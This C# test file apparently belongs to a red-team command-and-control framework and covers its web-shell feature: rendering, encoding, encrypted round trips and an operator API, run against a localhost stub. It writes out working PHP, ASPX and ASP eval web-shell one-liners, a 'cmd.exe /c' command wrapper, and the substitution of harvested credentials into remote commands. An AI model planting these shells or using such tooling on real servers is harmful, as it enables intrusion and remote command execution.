using System.Net;
using System.Net.Http.Json;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Rod.CoreState.Tasks;
using Rod.Transport;
using Rod.Transport.Endpoints;
using Rod.Transport.Listeners;
using Rod.Transport.WebShells;

namespace Rod.Integration.Tests;

/// <summary>
/// Acceptance: the web-shell surface (architecture.md Sec 5.2's Web-shell
/// class). Registration binds a placed script to the engagement through a
/// WebShell-class anchor row; both in-tree adapters' wire shapes are
/// pinned directly -- the Rod-native family (baked 256-bit key,
/// AES-256-GCM sealed request value and response body, a wrong key
/// answering nothing) and the universal one-liner PHP family (bootstrap
/// parameter, random payload variable, per-request marker halves, base64
/// framing) -- and the synchronous execution arc runs end to end against
/// a stub target that speaks the one-liner shape -- issue, claim, adapter
/// round trip, result -- landing as a completed task exactly like a
/// beacon's capture.
/// </summary>
public class WebShellTests
{
    [Fact]
    public void RodAdapter_RendersAOneLinerCarryingTheBakedKey()
    {
        var adapter = new RodPhpAdapter();
        var key = adapter.GenerateCredential();

        var script = adapter.RenderScript(key);

        Assert.StartsWith("<?php ", script);
        Assert.EndsWith("?>", script);
        Assert.Contains(key, script);
        Assert.True(adapter.IsValidCredential(key));
        Assert.False(adapter.IsValidCredential("connect"));
    }

    [Fact]
    public void RodAdapter_RoundTripsUnderTheBakedKey_AndRefusesEverythingElse()
    {
        var adapter = new RodPhpAdapter();
        var key = adapter.GenerateCredential();
        var wrongKey = adapter.GenerateCredential();

        var request = adapter.EncodeCommand(
            "http://web.example.test/rod.php", key, "aes-256-gcm", "aes-256-gcm", "whoami");

        // One form value under a random name, the sealed nonce‖ct‖tag shape.
        var parameter = Assert.Single(request.Form);
        Assert.NotEqual("whoami", parameter.Key);
        var sealedBody = Convert.FromBase64String(parameter.Value);
        Assert.True(sealedBody.Length > 12 + 16);

        // The endpoint's answer seals the same way under the same key.
        var answer = Convert.ToBase64String(Seal(key, "uid=0(root)"u8));
        Assert.Equal("uid=0(root)", adapter.DecodeResponse(request, "aes-256-gcm", answer));

        // A wrong key, a tampered body, and a non-protocol answer all read
        // as the same refusal: null.
        Assert.Null(adapter.DecodeResponse(
            request with { Credential = wrongKey }, "aes-256-gcm", answer));
        var tampered = Convert.FromBase64String(answer);
        tampered[tampered.Length / 2] ^= 1;
        Assert.Null(adapter.DecodeResponse(
            request, "aes-256-gcm", Convert.ToBase64String(tampered)));
        Assert.Null(adapter.DecodeResponse(request, "aes-256-gcm", "just a plain page"));
    }

    // The endpoint side of the sealed answer, mirroring the adapter's
    // nonce‖ciphertext‖tag shape so the decode path is exercised against
    // real GCM output.
    private static byte[] Seal(string credential, ReadOnlySpan<byte> plain)
    {
        var key = Convert.FromBase64String(credential);
        var nonce = RandomNumberGenerator.GetBytes(12);
        var ciphertext = new byte[plain.Length];
        var tag = new byte[16];
        using (var aes = new AesGcm(key, 16))
            aes.Encrypt(nonce, plain, ciphertext, tag);
        var value = new byte[12 + ciphertext.Length + 16];
        nonce.CopyTo(value.AsSpan(0, 12));
        ciphertext.CopyTo(value.AsSpan(12, ciphertext.Length));
        tag.CopyTo(value.AsSpan(12 + ciphertext.Length, 16));
        return value;
    }

    [Fact]
    public void RodJspAdapter_RendersASealedPageCarryingTheBakedKey()
    {
        var adapter = new RodJspAdapter();
        var key = adapter.GenerateCredential();

        var script = adapter.RenderScript(key);

        Assert.StartsWith("<%@", script);
        Assert.Contains($"decode(\"{key}\")", script);
        Assert.Equal(key, adapter.ReadCredentialFromScript(script));
    }

    [Fact]
    public void EvalAspxAdapter_RendersTheJScriptOneLiner_AndRoundTripsTheFramedAnswer()
    {
        var adapter = new EvalAspxAdapter();

        var script = adapter.RenderScript("connect");
        Assert.Equal(
            "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"connect\"],\"unsafe\");%>",
            script);
        Assert.Equal("connect", adapter.ReadCredentialFromScript(script));

        // The wrapper rides the connection parameter itself (the eval
        // consumes the value directly), the command base64-encoded inside
        // it; the answer frames with the family's markers around base64.
        var request = adapter.EncodeCommand(
            "http://web.example.test/up.aspx", "connect", "base64", "base64", "whoami");
        var parameter = Assert.Single(request.Form);
        Assert.Equal("connect", parameter.Key);
        Assert.Contains("FromBase64String", parameter.Value);
        Assert.DoesNotContain("whoami", parameter.Value);

        var framed = request.TagStart + Convert.ToBase64String("uid=0(root)"u8) + request.TagEnd;
        Assert.Equal("uid=0(root)", adapter.DecodeResponse(request, "base64", framed));
        Assert.Null(adapter.DecodeResponse(request, "base64", "just a plain page"));
    }

    [Fact]
    public void EvalAspAdapter_RendersTheExecuteOneLiner_AndRoundTripsTheFramedAnswer()
    {
        var adapter = new EvalAspAdapter();

        var script = adapter.RenderScript("connect");
        Assert.Equal("<%execute(request(\"connect\"))%>", script);
        Assert.Equal("connect", adapter.ReadCredentialFromScript(script));

        // The wrapper rides the connection parameter itself (the execute
        // consumes the value directly), the command VBScript-escaped inside
        // the platform shell's exec; the answer frames with the family's
        // markers around the MSXML base64.
        var request = adapter.EncodeCommand(
            "http://web.example.test/up.asp", "connect", "base64", "base64", "whoami \"x\"");
        var parameter = Assert.Single(request.Form);
        Assert.Equal("connect", parameter.Key);
        Assert.Contains("cmd.exe /c whoami \"\"x\"\"\"", parameter.Value);
        Assert.Contains("MSXML2.DOMDocument", parameter.Value);
        Assert.DoesNotContain(request.TagStart, parameter.Value);

        var framed = request.TagStart + Convert.ToBase64String("uid=0(root)"u8) + request.TagEnd;
        Assert.Equal("uid=0(root)", adapter.DecodeResponse(request, "base64", framed));
        Assert.Null(adapter.DecodeResponse(request, "base64", "just a plain page"));
    }

    [Fact]
    public void Adapter_RendersTheEvalOneLiner()
    {
        var adapter = new EvalPhpAdapter();

        Assert.Equal(
            "<?php @eval($_POST['connect']); ?>",
            adapter.RenderScript("connect"));
    }

    [Fact]
    public void Adapter_EncodesTheBootstrapAndRandomPayloadVariable()
    {
        var adapter = new EvalPhpAdapter();

        var request = adapter.EncodeCommand(
            "http://web.example.test/up.php", "connect", "base64", "base64", "whoami");

        Assert.Equal("http://web.example.test/up.php", request.Url);
        // The bootstrap rides the connection parameter; the payload rides
        // a random variable the bootstrap names.
        Assert.Equal(2, request.Form.Count);
        var payloadVariable = request.Form.Keys.Single(k => k != "connect");
        Assert.Equal(
            $"@eval(@base64_decode($_POST['{payloadVariable}']));",
            request.Form["connect"]);
        // The payload decodes to PHP that carries the framed answer with
        // the request's own markers, each split in halves so the payload
        // text never contains a marker whole.
        var payload = Encoding.UTF8.GetString(
            Convert.FromBase64String(request.Form[payloadVariable]));
        Assert.Contains("base64_decode('", payload);
        Assert.Contains($"echo \"{Half(request.TagStart)}\".\"{HalfBack(request.TagStart)}\"", payload);
        Assert.Contains($"echo \"{Half(request.TagEnd)}\".\"{HalfBack(request.TagEnd)}\"", payload);
    }

    [Fact]
    public void Adapter_DecodesTheFramedAnswer_AndRefusesUnmarkedBodies()
    {
        var adapter = new EvalPhpAdapter();
        var request = adapter.EncodeCommand(
            "http://web.example.test/up.php", "connect", "base64", "base64", "whoami");

        var framed = $"noise {request.TagStart}"
            + Convert.ToBase64String(Encoding.UTF8.GetBytes("uid=0(root)"))
            + $"{request.TagEnd} trailing";
        Assert.Equal("uid=0(root)", adapter.DecodeResponse(request, "base64", framed));

        // A body without the markers is a different protocol's answer.
        Assert.Null(adapter.DecodeResponse(request, "base64", "just a plain page"));
    }

    private static string Half(string tag) => tag[..(tag.Length / 2)];

    private static string HalfBack(string tag) => tag[(tag.Length / 2)..];

    [Fact]
    public async System.Threading.Tasks.Task WebShell_RegisterProbeExecute_AndTaskArc()
    {
        await using var target = await StubTarget.StartAsync();
        await using var env = await TestEnv.StartAsync();
        await AuthenticatedHost.LoginAsync(env.Http);
        var engagementId = await CreateEngagementAsync(env.Http);

        // Register the placed script; the answer carries the one-liner and
        // the parameter it was bound to.
        var registered = await env.Http.PostAsJsonAsync($"/engagements/{engagementId}/webshells",
            new RegisterWebShellRequest(target.Url, AdapterId: "eval-php", Password: "connect"));
        registered.EnsureSuccessStatusCode();
        var endpoint = await registered.Content.ReadFromJsonAsync<WebShellDto>();
        Assert.NotNull(endpoint);
        Assert.Equal("<?php @eval($_POST['connect']); ?>", endpoint!.Script);
        Assert.Equal("connect", endpoint.Password);
        var webshellId = endpoint.ImplantId;

        // The probe round-trips a marker echo and answers ok.
        var probed = await env.Http.PostAsync(
            $"/engagements/{engagementId}/webshells/{webshellId}:test", content: null);
        probed.EnsureSuccessStatusCode();
        var probe = await probed.Content.ReadFromJsonAsync<ProbeDto>();
        Assert.NotNull(probe);
        Assert.True(probe!.Ok, probe.Detail ?? "probe failed");

        // The synchronous execution: the stub answers the framed round
        // trip, and the command lands as a completed task.
        var executed = await env.Http.PostAsJsonAsync(
            $"/engagements/{engagementId}/webshells/{webshellId}:exec",
            new ExecuteWebShellRequest("whoami"));
        executed.EnsureSuccessStatusCode();
        var result = await executed.Content.ReadFromJsonAsync<ExecDto>();
        Assert.NotNull(result);
        Assert.Equal("Succeeded", result!.Outcome);
        Assert.Contains("ran: whoami", result.Output);

        var tasks = env.Host.Services.GetRequiredService<ITaskRepository>();
        Rod.CoreState.EngagementId.TryParse(engagementId, out var parsed);
        var tasksFor = await tasks.ListByEngagementAsync(parsed);
        Assert.Contains(tasksFor, t => t.Id.ToString() == result.TaskId
            && t.Status == Rod.CoreState.Tasks.TaskStatus.Completed);

        // Removal retires the anchor row and drops the profile.
        var removed = await env.Http.DeleteAsync($"/engagements/{engagementId}/webshells/{webshellId}");
        Assert.Equal(HttpStatusCode.NoContent, removed.StatusCode);
        var after = await env.Http.GetAsync($"/engagements/{engagementId}/webshells");
        after.EnsureSuccessStatusCode();
        var roster = await after.Content.ReadFromJsonAsync<WebShellDto[]>();
        Assert.Empty(roster!);
    }

    [Fact]
    public async System.Threading.Tasks.Task WebShell_RegisterRefusesAJunkUrl_AndForeignEngagementIsIsolated()
    {
        await using var env = await TestEnv.StartAsync();
        await AuthenticatedHost.LoginAsync(env.Http);
        var engagementId = await CreateEngagementAsync(env.Http);
        var otherEngagementId = await CreateEngagementAsync(env.Http);

        var junk = await env.Http.PostAsJsonAsync($"/engagements/{engagementId}/webshells",
            new RegisterWebShellRequest("not a url"));
        Assert.Equal(HttpStatusCode.BadRequest, junk.StatusCode);

        await using var target = await StubTarget.StartAsync();
        var registered = await env.Http.PostAsJsonAsync($"/engagements/{engagementId}/webshells",
            new RegisterWebShellRequest(target.Url, AdapterId: "eval-php", Password: "connect"));
        registered.EnsureSuccessStatusCode();
        var endpoint = await registered.Content.ReadFromJsonAsync<WebShellDto>();

        // A foreign engagement's roster is empty and its scoped routes
        // refuse the endpoint as unknown.
        var foreignList = await env.Http.GetFromJsonAsync<WebShellDto[]>(
            $"/engagements/{otherEngagementId}/webshells");
        Assert.Empty(foreignList!);
        var foreignExec = await env.Http.PostAsJsonAsync(
            $"/engagements/{otherEngagementId}/webshells/{endpoint!.ImplantId}:exec",
            new ExecuteWebShellRequest("whoami"));
        Assert.Equal(HttpStatusCode.NotFound, foreignExec.StatusCode);
    }

    [Fact]
    public async System.Threading.Tasks.Task GenerateScript_RendersAndStores_WithoutRegistration()
    {
        await using var env = await TestEnv.StartAsync();
        await AuthenticatedHost.LoginAsync(env.Http);
        var engagementId = await CreateEngagementAsync(env.Http);

        // Generation decoupled from registration: no URL anywhere, and an
        // unsupplied adapter falls back to the Rod-native family with a
        // freshly baked key.
        var generated = await env.Http.PostAsJsonAsync(
            $"/engagements/{engagementId}/webshells/scripts",
            new GenerateWebShellScriptRequest());
        generated.EnsureSuccessStatusCode();
        var script = await generated.Content.ReadFromJsonAsync<ScriptDto>();
        Assert.NotNull(script);
        Assert.Equal("rod-php", script!.AdapterId);
        Assert.Equal("php", script.ScriptLanguage);
        // The credential is a real 256-bit key, baked into the script.
        Assert.Equal(32, Convert.FromBase64String(script.Password).Length);
        Assert.Contains(script.Password, script.Script);

        // The script landed in the payload store like any build: content,
        // fingerprint, class -- re-downloadable under its payload id.
        var payloads = env.Host.Services.GetRequiredService<Rod.Audit.IPayloadStore>();
        var stored = await payloads.FindAsync(
            Guid.Parse(script.PayloadId), Guid.Parse(engagementId));
        Assert.NotNull(stored);
        Assert.Equal(script.Script, Encoding.UTF8.GetString(stored!.Content));
        Assert.Equal(script.Fingerprint, stored.Fingerprint);
        Assert.Equal("WebShell", stored.Class);
        Assert.Equal("php", stored.UnitId);

        // Generation registered nothing: the endpoint roster stays empty.
        var roster = await env.Http.GetFromJsonAsync<WebShellDto[]>(
            $"/engagements/{engagementId}/webshells");
        Assert.Empty(roster!);
    }

    [Fact]
    public async System.Threading.Tasks.Task WebShell_ExecSubstitutesCredentialsOnTheWire_StoresKeepThePlaceholder()
    {
        // The ADR-005 boundary this surface owed: the synchronous execute
        // channel plays the beacon, so it carries the beacon's substitution
        // rule -- the adapter round trip holds the secret, the task row and
        // the audit arc keep the placeholder -- and an unresolvable token is
        // refused at issuance, never sent anywhere.
        await using var target = await StubTarget.StartAsync();
        await using var env = await TestEnv.StartAsync();
        await AuthenticatedHost.LoginAsync(env.Http);
        var engagementId = await CreateEngagementAsync(env.Http);

        var registered = await env.Http.PostAsJsonAsync($"/engagements/{engagementId}/webshells",
            new RegisterWebShellRequest(target.Url, AdapterId: "eval-php", Password: "connect"));
        registered.EnsureSuccessStatusCode();
        var endpoint = await registered.Content.ReadFromJsonAsync<WebShellDto>();
        Assert.NotNull(endpoint);

        Rod.CoreState.EngagementId.TryParse(engagementId, out var engagement);
        var credentials = env.Host.Services.GetRequiredService<Rod.CoreState.Collaboration.ICredentialStore>();
        var credential = new Rod.CoreState.Collaboration.CredentialRecord(
            Rod.CoreState.CredentialId.New(), engagement,
            Rod.CoreState.TaskId.New(), Rod.CoreState.ImplantId.New(),
            "password", "svc-web", "runuser-s3cret", Source: null, Host: "web01", Note: null,
            env.Host.Services.GetRequiredService<TimeProvider>().GetUtcNow());
        await credentials.AddAsync(credential, CancellationToken.None);

        // The wire carries the secret: the stub echoes the command it ran.
        var token = $"$cred-{credential.Id}";
        var executed = await env.Http.PostAsJsonAsync(
            $"/engagements/{engagementId}/webshells/{endpoint!.ImplantId}:exec",
            new ExecuteWebShellRequest($"runuser {token} /svc"));
        executed.EnsureSuccessStatusCode();
        var result = await executed.Content.ReadFromJsonAsync<ExecDto>();
        Assert.NotNull(result);
        Assert.Equal("Succeeded", result!.Outcome);
        Assert.Contains("runuser-s3cret", result.Output);
        Assert.DoesNotContain(token, result.Output);

        // The store keeps the placeholder the operator wrote.
        var tasks = env.Host.Services.GetRequiredService<ITaskRepository>();
        var row = (await tasks.ListByEngagementAsync(engagement))
            .Single(t => t.Id.ToString() == result.TaskId);
        Assert.Equal($"runuser {token} /svc", row.Arguments);

        // A token no engagement row answers is refused before the queue,
        // with the offender named -- nothing reaches the target.
        var unresolved = await env.Http.PostAsJsonAsync(
            $"/engagements/{engagementId}/webshells/{endpoint.ImplantId}:exec",
            new ExecuteWebShellRequest($"runuser $cred-{Guid.NewGuid()} /svc"));
        Assert.Equal(HttpStatusCode.UnprocessableEntity, unresolved.StatusCode);
        var problem = await unresolved.Content.ReadFromJsonAsync<Problem>();
        Assert.Contains("$cred-", problem!.Error);
    }

    private sealed record ScriptDto(
        string PayloadId, string AdapterId, string ScriptLanguage,
        string Password, string Script, string Fingerprint);

    private static async System.Threading.Tasks.Task<string> CreateEngagementAsync(HttpClient client)
    {
        var response = await client.PostAsJsonAsync("/engagements",
            new EngagementEndpoints.CreateEngagementRequest(Name: "Operation Webshell"));
        response.EnsureSuccessStatusCode();
        var created = await response.Content.ReadFromJsonAsync<EngagementEndpoints.EngagementResponse>();
        return created!.EngagementId;
    }

    private sealed record WebShellDto(
        string ImplantId, string Url, string AdapterId, string Password,
        string ScriptLanguage, bool Retired, string? Script = null);

    private sealed record ProbeDto(bool Ok, long LatencyMs, string? Detail = null);

    private sealed record ExecDto(string TaskId, string Output, string Outcome, long ElapsedMs);

    /// <summary>
    /// A stub web root speaking the one-liner family's PHP server side: it parses the
    /// bootstrap parameter, decodes the payload, reads the command and the
    /// marker halves out of the payload text, and answers with the framed
    /// base64 body the adapter decodes. This is the protocol-conformance
    /// target -- it exercises exactly the shape the adapter emits, nothing
    /// more.
    /// </summary>
    private sealed class StubTarget : IAsyncDisposable
    {
        private readonly HttpListener _listener;

        public string Url { get; }

        private StubTarget(HttpListener listener, int port)
        {
            _listener = listener;
            Url = $"http://127.0.0.1:{port}/shell.php";
        }

        public static async System.Threading.Tasks.Task<StubTarget> StartAsync()
        {
            var port = TestSupport.GetFreeTcpPort();
            var listener = new HttpListener();
            listener.Prefixes.Add($"http://127.0.0.1:{port}/");
            listener.Start();
            var target = new StubTarget(listener, port);
            _ = System.Threading.Tasks.Task.Run(target.ServeAsync);
            await System.Threading.Tasks.Task.Yield();
            return target;
        }

        private async System.Threading.Tasks.Task ServeAsync()
        {
            while (_listener.IsListening)
            {
                HttpListenerContext context;
                try
                {
                    context = await _listener.GetContextAsync();
                }
                catch (HttpListenerException)
                {
                    return; // disposed
                }

                try
                {
                    var form = await ReadFormAsync(context.Request);
                    var answer = Answer(form);
                    var bytes = Encoding.UTF8.GetBytes(answer);
                    context.Response.ContentType = "text/html";
                    context.Response.ContentLength64 = bytes.Length;
                    await context.Response.OutputStream.WriteAsync(bytes);
                }
                catch
                {
                    try { context.Response.StatusCode = 500; } catch { /* already gone */ }
                }
                finally
                {
                    context.Response.Close();
                }
            }
        }

        // The server side of the eval one-liner: find the bootstrap
        // parameter, evaluate what it names, and run the payload's framing
        // by hand -- the stub's whole PHP interpretation is the extraction
        // of the command and the marker halves.
        private static string Answer(IReadOnlyDictionary<string, string> form)
        {
            var bootstrap = form.FirstOrDefault(kv =>
                kv.Value.StartsWith("@eval(@base64_decode($_POST['", StringComparison.Ordinal));
            if (bootstrap.Key is null)
                return "not this protocol";

            var payloadVariable = Regex.Match(
                bootstrap.Value, @"\$_POST\['([a-z0-9]+)'\]").Groups[1].Value;
            if (!form.TryGetValue(payloadVariable, out var encoded))
                return $"payload variable missing: {payloadVariable} among [{string.Join(",", form.Keys)}]";

            var payload = Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
            var command = Encoding.UTF8.GetString(Convert.FromBase64String(
                Regex.Match(payload, @"base64_decode\('([A-Za-z0-9+/=]+)'\)").Groups[1].Value));
            var tags = Regex.Matches(payload, @"echo ""([a-z0-9]*)""\.""([a-z0-9]*)"";")
                .Select(m => m.Groups[1].Value + m.Groups[2].Value)
                .ToArray();
            if (tags.Length < 2)
                return $"markers missing (payload was {payload.Length} chars)";

            return tags[0]
                + Convert.ToBase64String(Encoding.UTF8.GetBytes($"ran: {command}"))
                + tags[1];
        }

        private static async System.Threading.Tasks.Task<IReadOnlyDictionary<string, string>> ReadFormAsync(
            HttpListenerRequest request)
        {
            using var reader = new StreamReader(request.InputStream, Encoding.UTF8);
            var body = await reader.ReadToEndAsync();
            return body.Split('&')
                .Select(part => part.Split('=', 2))
                .Where(kv => kv.Length == 2)
                .ToDictionary(
                    kv => Uri.UnescapeDataString(kv[0].Replace('+', ' ')),
                    kv => Uri.UnescapeDataString(kv[1].Replace('+', ' ')));
        }

        public ValueTask DisposeAsync()
        {
            _listener.Stop();
            _listener.Close();
            return ValueTask.CompletedTask;
        }
    }

    /// <summary>
    /// A real teamserver with the operator API, the same harness shape the
    /// shellcatch tests use.
    /// </summary>
    private sealed class TestEnv : IAsyncDisposable
    {
        public IHost Host { get; private set; } = null!;
        public HttpClient Http { get; private set; } = null!;

        public static async System.Threading.Tasks.Task<TestEnv> StartAsync()
        {
            var env = new TestEnv();
            var httpPort = TestSupport.GetFreeTcpPort();

            var config = AuthenticatedHost.BuildConfig();
            env.Host = TransportHost.CreateHostBuilder(
                    configureServices: services => AuthenticatedHost.ComposeServices(services, config),
                    mapEndpoints: endpoints => AuthenticatedHost.ComposeEndpoints(endpoints),
                    configuration: config)
                .ConfigureWebHost(webBuilder => webBuilder
                    .UseRodListeners(new List<ListenerConfig>())
                    .ConfigureKestrel(kestrel => kestrel.ListenLocalhost(httpPort)))
                .Build();
            await env.Host.StartAsync();

            env.Http = new HttpClient(new CookieHandler(new HttpClientHandler()))
            {
                BaseAddress = new Uri($"http://127.0.0.1:{httpPort}"),
            };
            return env;
        }

        public async ValueTask DisposeAsync()
        {
            Http?.Dispose();
            if (Host is not null)
                await Host.StopAsync();
            Host?.Dispose();
        }
    }
}
